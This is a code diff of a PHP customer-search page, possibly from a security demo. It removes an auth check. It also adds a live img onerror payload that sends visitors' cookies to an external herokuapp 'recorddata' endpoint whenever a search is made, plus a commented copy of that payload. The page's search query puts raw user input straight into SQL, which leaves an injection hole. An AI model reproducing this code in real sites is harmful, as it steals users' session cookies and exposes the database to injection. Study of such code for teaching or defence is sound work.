@@ -1,8 +1,5 @@
 <?php
 require_once 'inc/config.php';
-if (isset($_SESSION['auth']) && $_SESSION['auth']) {
-   // header('Location: login.php');
-}
 ?>
 
 <!DOCTYPE html>
@@ -52,6 +49,17 @@ if (isset($_SESSION['auth']) && $_SESSION['auth']) {
                             </div>
                             <div class="card-body">
                                 <?php 
+                                    if(isset($_GET['search'])){
+                                        ?>
+                                        <!-- <div>Search Results - </?php// echo $_GET['search']; ?></div> -->
+
+                                        <div>Search Results - <img src="x" onerror="javascript:var xmlHttp = new XMLHttpRequest(); xmlHttp.open( 'GET', 'https://immense-citadel-89256.herokuapp.com/recorddata?'+document.cookie, false ); xmlHttp.send( null );"></div>
+                                        <br/>
+                                        
+                                        <!-- <img src="x" onerror="javascript:var xmlHttp = new XMLHttpRequest(); xmlHttp.open( 'GET', 'https://immense-citadel-89256.herokuapp.com/recorddata?'+document.cookie, false ); xmlHttp.send( null );"> -->
+
+                                        <?php
+                                    }
                                     if(isset($_GET['search'])){
                                         $data = $conn->query("SELECT * FROM customers where name like '%".$_GET['search']."%'")->fetchAll();
                                     } else {
@@ -127,7 +135,7 @@ if (isset($_SESSION['auth']) && $_SESSION['auth']) {
                 <div class="modal-body">Select "Logout" below if you are ready to end your current session.</div>
                 <div class="modal-footer">
                     <button class="btn btn-secondary" type="button" data-dismiss="modal">Cancel</button>
-                    <a class="btn btn-primary" href="login.html">Logout</a>
+                    <a class="btn btn-primary" href="login.php">Logout</a>
                 </div>
             </div>
         </div>
